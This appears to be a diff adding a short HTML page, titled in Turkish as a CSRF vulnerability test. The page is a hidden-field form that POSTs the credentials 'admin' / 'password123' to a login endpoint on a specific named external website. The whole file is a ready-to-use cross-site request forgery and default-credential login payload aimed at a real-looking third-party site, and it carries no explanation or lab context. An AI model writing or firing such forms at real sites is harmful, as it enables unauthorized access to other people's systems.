@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test Formu</title>
+</head>
+<body>
+    <h2>CSRF Açığı Testi</h2>
+    <form action="https://liveeatcolour.com/remote-login.php" method="POST">
+        <input type="hidden" name="username" value="admin">
+        <input type="hidden" name="password" value="password123">
+        <input type="submit" value="Giriş Yap">
+    </form>
+</body>
+</html>
